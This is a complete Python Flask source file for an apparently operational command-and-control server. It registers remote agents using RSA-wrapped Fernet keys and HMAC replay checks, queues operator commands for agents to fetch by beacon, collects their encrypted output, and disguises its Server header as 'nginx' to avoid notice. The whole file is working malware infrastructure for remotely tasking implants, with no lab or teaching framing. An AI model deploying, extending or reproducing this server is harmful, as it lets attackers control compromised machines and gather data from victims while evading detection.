"""
C2 Server — Hardened
=====================
Security model:
  - RSA-2048 key pair generated at startup; public key served to agents.
  - Each agent generates its own Fernet session key, encrypts it with the
    server RSA public key, and sends it during registration.
  - All subsequent agent traffic is encrypted with the per-agent Fernet key.
  - Every agent request carries an HMAC-SHA256 (keyed on the agent's session
    key) over "agent_id:timestamp_ms" — providing per-request authentication
    and replay protection within a ±60 s window.
  - Operator push endpoint is protected by a separate OPERATOR_TOKEN env var
    (never shared with agents).
  - SQLite persists agent registry, task queue, and result log.
  - waitress WSGI server; Werkzeug Server header is stripped.

Environment variables:
  OPERATOR_TOKEN   — secret for the operator push endpoint (required)
  C2_HOST          — bind host (default 0.0.0.0)
  C2_PORT          — bind port (default 5000)
"""

import os
import json
import hmac
import time
import hashlib
import sqlite3
import logging
from functools import wraps

from flask import Flask, request, jsonify, g
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.fernet import Fernet
from waitress import serve

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
log = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Config (from environment — never hardcode secrets)
# ---------------------------------------------------------------------------
OPERATOR_TOKEN: str = os.environ.get("OPERATOR_TOKEN", "")
if not OPERATOR_TOKEN:
    raise SystemExit(
        "[FATAL] OPERATOR_TOKEN environment variable is not set. "
        "Set it before starting the server."
    )

C2_HOST: str = os.environ.get("C2_HOST", "0.0.0.0")
C2_PORT: int = int(os.environ.get("C2_PORT", "5000"))

# Replay window: reject requests whose timestamp differs > this many seconds.
REPLAY_WINDOW_S: int = 60

# In-memory nonce cache: (agent_id, timestamp_ms) -> seen_time
_nonce_cache: dict[tuple, float] = {}
NONCE_TTL_S: int = 120  # clean nonces older than this

# ---------------------------------------------------------------------------
# RSA key pair (generated fresh each server start)
# ---------------------------------------------------------------------------
log.info("Generating RSA-2048 key pair …")
_rsa_private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
)
_rsa_public_key = _rsa_private_key.public_key()
RSA_PUBLIC_PEM: bytes = _rsa_public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo,
)
log.info("RSA key pair ready.")

# ---------------------------------------------------------------------------
# Database
# ---------------------------------------------------------------------------
DB_PATH = os.path.join(os.path.dirname(__file__), "c2.db")


def get_db() -> sqlite3.Connection:
    """Return a per-request SQLite connection stored on Flask's `g`."""
    if "db" not in g:
        g.db = sqlite3.connect(DB_PATH, isolation_level=None)
        g.db.row_factory = sqlite3.Row
    return g.db


def init_db() -> None:
    """Create tables if they don't exist."""
    con = sqlite3.connect(DB_PATH)
    con.executescript("""
        CREATE TABLE IF NOT EXISTS agents (
            agent_id     TEXT PRIMARY KEY,
            session_key  BLOB NOT NULL,   -- Fernet key bytes (plaintext, stored server-side)
            token        TEXT NOT NULL,   -- HMAC-derived agent token
            registered   REAL NOT NULL,
            last_seen    REAL
        );

        CREATE TABLE IF NOT EXISTS tasks (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id    TEXT    NOT NULL,
            payload     TEXT    NOT NULL,  -- JSON string of the task dict
            status      TEXT    NOT NULL DEFAULT 'pending',
            created_at  REAL    NOT NULL
        );

        CREATE TABLE IF NOT EXISTS results (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id    TEXT NOT NULL,
            task_id     INTEGER NOT NULL,
            output      TEXT,
            received_at REAL NOT NULL
        );
    """)
    con.close()
    log.info("Database initialised at %s", DB_PATH)


# ---------------------------------------------------------------------------
# Crypto helpers
# ---------------------------------------------------------------------------

def _fernet_for_agent(agent_id: str) -> Fernet:
    """Look up the stored session key and return a Fernet cipher."""
    row = get_db().execute(
        "SELECT session_key FROM agents WHERE agent_id = ?", (agent_id,)
    ).fetchone()
    if not row:
        raise ValueError(f"Unknown agent: {agent_id}")
    return Fernet(bytes(row["session_key"]))


def encrypt_for_agent(agent_id: str, data: dict) -> bytes:
    return _fernet_for_agent(agent_id).encrypt(json.dumps(data).encode())


def decrypt_from_agent(agent_id: str, payload: bytes) -> dict:
    return json.loads(_fernet_for_agent(agent_id).decrypt(payload).decode())


def _make_agent_token(agent_id: str) -> str:
    """HMAC-SHA256 of agent_id keyed on OPERATOR_TOKEN — unique per agent."""
    return hmac.new(
        OPERATOR_TOKEN.encode(),
        agent_id.encode(),
        hashlib.sha256,
    ).hexdigest()


# ---------------------------------------------------------------------------
# Request authentication helpers
# ---------------------------------------------------------------------------

def _purge_nonces() -> None:
    now = time.time()
    expired = [k for k, t in _nonce_cache.items() if now - t > NONCE_TTL_S]
    for k in expired:
        del _nonce_cache[k]


def verify_agent_request(agent_id: str, timestamp_ms: str, sig: str) -> bool:
    """
    Verify per-request HMAC + freshness + replay protection.
    Signature = HMAC-SHA256(session_key, f"{agent_id}:{timestamp_ms}")
    """
    try:
        ts = int(timestamp_ms)
    except (TypeError, ValueError):
        return False

    # Freshness check
    now_ms = int(time.time() * 1000)
    if abs(now_ms - ts) > REPLAY_WINDOW_S * 1000:
        log.warning("Stale timestamp from agent %s (drift %d ms)", agent_id, now_ms - ts)
        return False

    # Replay check
    _purge_nonces()
    nonce_key = (agent_id, ts)
    if nonce_key in _nonce_cache:
        log.warning("Replay detected from agent %s", agent_id)
        return False

    # Lookup session key
    row = get_db().execute(
        "SELECT session_key FROM agents WHERE agent_id = ?", (agent_id,)
    ).fetchone()
    if not row:
        return False

    session_key = bytes(row["session_key"])
    expected = hmac.new(
        session_key,
        f"{agent_id}:{timestamp_ms}".encode(),
        hashlib.sha256,
    ).hexdigest()

    if not hmac.compare_digest(expected, sig):
        log.warning("HMAC mismatch from agent %s", agent_id)
        return False

    _nonce_cache[nonce_key] = time.time()
    return True


def require_agent_auth(f):
    """Decorator: verify X-Agent-Id, X-Timestamp, X-Signature headers."""
    @wraps(f)
    def wrapper(*args, **kwargs):
        agent_id  = request.headers.get("X-Agent-Id", "")
        timestamp = request.headers.get("X-Timestamp", "")
        signature = request.headers.get("X-Signature", "")
        if not verify_agent_request(agent_id, timestamp, signature):
            return jsonify({"error": "unauthorized"}), 401
        request.agent_id = agent_id  # make available to view
        return f(*args, **kwargs)
    return wrapper


def require_operator(f):
    """Decorator: verify Authorization: Bearer <OPERATOR_TOKEN>."""
    @wraps(f)
    def wrapper(*args, **kwargs):
        auth = request.headers.get("Authorization", "")
        token = auth.removeprefix("Bearer ").strip()
        if not hmac.compare_digest(token, OPERATOR_TOKEN):
            return jsonify({"error": "forbidden"}), 403
        return f(*args, **kwargs)
    return wrapper


# ---------------------------------------------------------------------------
# Flask app
# ---------------------------------------------------------------------------
app = Flask(__name__)


@app.after_request
def strip_server_header(response):
    response.headers["Server"] = "nginx"          # masquerade
    response.headers.pop("X-Powered-By", None)
    return response


@app.teardown_appcontext
def close_db(exc):
    db = g.pop("db", None)
    if db is not None:
        db.close()


# ---------------------------------------------------------------------------
# Endpoints
# ---------------------------------------------------------------------------

@app.route("/pub", methods=["GET"])
def get_public_key():
    """Serve RSA public key so agents can encrypt their session key."""
    return RSA_PUBLIC_PEM, 200, {"Content-Type": "application/x-pem-file"}


@app.route("/api/register", methods=["POST"])
def register():
    """
    Agent registration.
    Body (JSON, plaintext — this is the bootstrap step before encryption):
      {
        "agent_id": "<uuid>",
        "session_key_enc": "<base64 RSA-OAEP encrypted Fernet key>",
        "timestamp_ms": <int ms since epoch>
      }
    Returns JSON: {"token": "<agent-token>"}
    """
    try:
        body = request.get_json(force=True, silent=True) or {}
        agent_id      = body.get("agent_id", "")
        sk_enc_b64    = body.get("session_key_enc", "")
        timestamp_ms  = body.get("timestamp_ms", 0)

        if not agent_id or not sk_enc_b64:
            return jsonify({"error": "missing fields"}), 400

        # Timestamp freshness (bootstrap replay guard)
        now_ms = int(time.time() * 1000)
        if abs(now_ms - int(timestamp_ms)) > REPLAY_WINDOW_S * 1000:
            return jsonify({"error": "stale timestamp"}), 401

        import base64
        sk_enc = base64.b64decode(sk_enc_b64)

        # RSA-decrypt the agent's session key
        session_key = _rsa_private_key.decrypt(
            sk_enc,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None,
            ),
        )

        # Validate it's a proper Fernet key (44 url-safe base64 bytes)
        Fernet(session_key)

        token = _make_agent_token(agent_id)
        now   = time.time()

        db = get_db()
        db.execute(
            """INSERT INTO agents (agent_id, session_key, token, registered, last_seen)
               VALUES (?, ?, ?, ?, ?)
               ON CONFLICT(agent_id) DO UPDATE
               SET session_key=excluded.session_key, token=excluded.token,
                   last_seen=excluded.last_seen""",
            (agent_id, session_key, token, now, now),
        )
        log.info("[+] Agent registered: %s", agent_id)
        return jsonify({"token": token}), 200

    except Exception as e:
        log.error("Registration error: %s", e)
        return jsonify({"error": "registration failed"}), 400


@app.route("/api/agent/<agent_id>", methods=["DELETE"])
@require_operator
def delete_agent(agent_id):
    try:
        db = get_db()

        row = db.execute(
            "SELECT 1 FROM agents WHERE agent_id = ?", (agent_id,)
        ).fetchone()

        if not row:
            return jsonify({"error": "unknown agent"}), 404

        db.execute("DELETE FROM tasks WHERE agent_id = ?", (agent_id,))
        db.execute("DELETE FROM results WHERE agent_id = ?", (agent_id,))
        db.execute("DELETE FROM agents WHERE agent_id = ?", (agent_id,))

        log.info("[+] Agent deleted: %s", agent_id)
        return jsonify({"status": "deleted"}), 200

    except Exception as e:
        log.error("Delete error: %s", e)
        return jsonify({"error": "delete failed"}), 500


@app.route("/api/results/<agent_id>", methods=["GET"])
@require_operator
def get_results(agent_id):
    try:
        db = get_db()

        row = db.execute(
            "SELECT 1 FROM agents WHERE agent_id = ?",
            (agent_id,)
        ).fetchone()

        if not row:
            return jsonify({"error": "unknown agent"}), 404

        rows = db.execute(
            """SELECT t.id, t.payload, t.status, t.created_at, r.output, r.received_at 
               FROM tasks t 
               LEFT JOIN results r ON t.id = r.task_id 
               WHERE t.agent_id = ? 
               ORDER BY t.created_at DESC LIMIT 20""",
            (agent_id,)
        ).fetchall()

        results = []
        for r in rows:
            d = dict(r)
            try:
                payload = json.loads(d["payload"])
                d["type"] = payload.get("type", "unknown")
                d["command"] = payload.get("command", "")
            except:
                d["type"] = "unknown"
            results.append(d)

        return jsonify(results), 200

    except Exception as e:
        log.error("Result fetch error: %s", e)
        return jsonify({"error": "server error"}), 500

@app.route("/api/status", methods=["POST"])
@require_agent_auth
def beacon():
    """
    Agent beacon — returns the next pending task (if any).
    Body: Fernet-encrypted JSON {"id": "<agent_id>"}
    """
    agent_id = request.agent_id
    try:
        encrypted = request.get_data()
        data      = decrypt_from_agent(agent_id, encrypted)

        if data.get("id") != agent_id:
            return jsonify({"error": "id mismatch"}), 401

        # Update last_seen
        get_db().execute(
            "UPDATE agents SET last_seen = ? WHERE agent_id = ?",
            (time.time(), agent_id),
        )

        # Pop one pending task
        db  = get_db()
        row = db.execute(
            "SELECT id, payload FROM tasks WHERE agent_id = ? AND status = 'pending' "
            "ORDER BY id LIMIT 1",
            (agent_id,),
        ).fetchone()

        task_out = None
        if row:
            task_out = json.loads(row["payload"])
            task_out["task_id"] = row["id"]  # Add task_id to the payload
            db.execute(
                "UPDATE tasks SET status = 'delivered' WHERE id = ?", (row["id"],)
            )
            log.info("[>] Task %d delivered to %s", row["id"], agent_id)

        return encrypt_for_agent(agent_id, {"task": task_out})

    except Exception as e:
        log.error("Beacon error for %s: %s", agent_id, e)
        return jsonify({"error": "server error"}), 500


@app.route("/api/upload", methods=["POST"])
@require_agent_auth
def result():
    """
    Agent result upload.
    Body: Fernet-encrypted JSON {"id": "<agent_id>", "output": "<string>"}
    """
    agent_id = request.agent_id
    try:
        data   = decrypt_from_agent(agent_id, request.get_data())
        task_id = data.get("task_id")
        output  = data.get("output", "")

        db = get_db()
        db.execute(
            "INSERT INTO results (agent_id, task_id, output, received_at) VALUES (?, ?, ?, ?)",
            (agent_id, task_id, output, time.time()),
        )
        if task_id:
            db.execute(
                "UPDATE tasks SET status = 'completed' WHERE id = ?", (task_id,)
            )
        
        log.info("[+] Result received from %s (task %s)", agent_id, task_id)
        return encrypt_for_agent(agent_id, {"status": "received"})
    except Exception as e:
        log.error("Result error for %s: %s", agent_id, e)
        return jsonify({"error": "server error"}), 500


@app.route("/api/push", methods=["POST"])
@require_operator
def push_task():
    try:
        data     = request.get_json(force=True, silent=True) or {}
        agent_id = data.get("agent_id", "")
        if not agent_id:
            return jsonify({"error": "missing agent_id"}), 400

        # Verify agent exists
        row = get_db().execute(
            "SELECT 1 FROM agents WHERE agent_id = ?", (agent_id,)
        ).fetchone()
        if not row:
            return jsonify({"error": "unknown agent"}), 404

        db = get_db()
        cursor = db.execute(
            "INSERT INTO tasks (agent_id, payload, status, created_at) "
            "VALUES (?, ?, 'pending', ?)",
            (agent_id, json.dumps(data), time.time()),
        )

        task_id = cursor.lastrowid

        log.info("[+] Task queued (%d) for %s: %s",
                 task_id, agent_id, data.get("type"))

        return jsonify({
            "status": "queued",
            "task_id": task_id
        }), 200

    except Exception as e:
        log.error("Push error: %s", e)
        return jsonify({"error": "server error"}), 500
    
@app.route("/api/agents", methods=["GET"])
@require_operator
def list_agents():
    """Operator convenience: list registered agents."""
    rows = get_db().execute(
        "SELECT agent_id, registered, last_seen FROM agents ORDER BY last_seen DESC"
    ).fetchall()
    return jsonify([dict(r) for r in rows]), 200


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    init_db()
    log.info("Starting C2 on %s:%d", C2_HOST, C2_PORT)
    log.info("OPERATOR_TOKEN is set (%d chars)", len(OPERATOR_TOKEN))
    serve(app, host=C2_HOST, port=C2_PORT)
